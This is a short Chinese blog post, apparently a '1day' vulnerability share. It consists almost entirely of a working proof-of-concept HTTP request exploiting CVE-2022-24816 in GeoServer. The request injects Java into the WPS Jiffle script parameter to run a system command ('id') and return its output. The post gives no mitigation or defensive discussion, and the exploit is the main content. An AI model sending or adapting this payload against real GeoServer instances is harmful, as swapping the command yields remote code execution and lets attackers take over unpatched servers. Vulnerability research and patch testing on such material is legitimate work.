#  1day分享 ｜ Geoserver命令执行漏洞   
原创 审计的土拨鼠  土拨鼠的安全屋   2024-04-19 22:12  
  
## 漏洞复现  
  
CVE-2022-24816，geoserver命令执行漏洞  
  
访问:http://127.0.0.1/geoserver/ows  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVgH771c1YSdVXevC66pGKA4kUA8s8ianTia6puWFibWce0iact6icHbvpZSqAWy8DVTRqwiasdHKD4cCdg/640?wx_fmt=png&from=appmsg "")  
  
poc  
```
POST /geoserver/wms HTTP/1.1
Host: xxxxxxxxx
Content-Type: application/xml
Accept-Encoding: gzip, deflate

<?xml version="1.0" encoding="UTF-8"?>
  <wps:Execute version="1.0.0" service="WPS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.opengis.net/wps/1.0.0" xmlns:wfs="http://www.opengis.net/wfs" xmlns:wps="http://www.opengis.net/wps/1.0.0" xmlns:ows="http://www.opengis.net/ows/1.1" xmlns:gml="http://www.opengis.net/gml" xmlns:ogc="http://www.opengis.net/ogc" xmlns:wcs="http://www.opengis.net/wcs/1.1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xsi:schemaLocation="http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd">
    <ows:Identifier>ras:Jiffle</ows:Identifier>
    <wps:DataInputs>
      <wps:Input>
        <ows:Identifier>coverage</ows:Identifier>
        <wps:Data>
          <wps:ComplexData mimeType="application/arcgrid"><![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]></wps:ComplexData>
        </wps:Data>
      </wps:Input>
      <wps:Input>
        <ows:Identifier>script</ows:Identifier>
        <wps:Data>
          <wps:LiteralData>dest = y() - (500); // */ public class Double {    public static double NaN = 0;  static { try {  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("id").getInputStream())); String line = null; String allLines = " - "; while ((line = reader.readLine()) != null) { allLines += line; } throw new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /**</wps:LiteralData>
        </wps:Data>
      </wps:Input>
      <wps:Input>
        <ows:Identifier>outputType</ows:Identifier>
        <wps:Data>
          <wps:LiteralData>DOUBLE</wps:LiteralData>
        </wps:Data>
      </wps:Input>
    </wps:DataInputs>
    <wps:ResponseForm>
      <wps:RawDataOutput mimeType="image/tiff">
        <ows:Identifier>result</ows:Identifier>
      </wps:RawDataOutput>
    </wps:ResponseForm>
  </wps:Execute>

```  
  
  
  
